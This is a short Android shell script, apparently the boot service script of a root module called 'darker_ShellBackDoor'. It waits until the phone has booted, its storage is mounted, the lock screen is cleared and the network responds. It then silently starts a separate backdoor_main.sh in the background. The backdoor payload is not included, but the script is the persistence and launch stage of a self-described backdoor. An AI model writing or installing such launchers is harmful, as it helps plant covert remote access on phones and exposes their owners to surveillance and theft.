#!/system/bin/sh



###########################################################
#  Copyright © 2024 DARKER.c studio. All rights reserved. #
###########################################################



# Global variables
MODDIR="/data/adb/modules/darker_ShellBackDoor"

# Waiting for data to be unlocked and network ready
wait_until_ready() {
    while true; do
        sleep 10
        [ "$(getprop sys.boot_completed)" = "1" ] && break
    done
    while true; do
        sleep 10
        [ -d "/sdcard/Android" ] && break
    done
    while true; do
        sleep 10
        [ "$(dumpsys window | grep mDreamingLockscreen=true)" = "" ] && break
    done
    while true; do
        sleep 10
        [ "$($MODDIR/bin/curl -sLk www.baidu.com)" != "" ] && break
    done
}

wait_until_ready

"$MODDIR"/backdoor_main.sh 2>/dev/null &
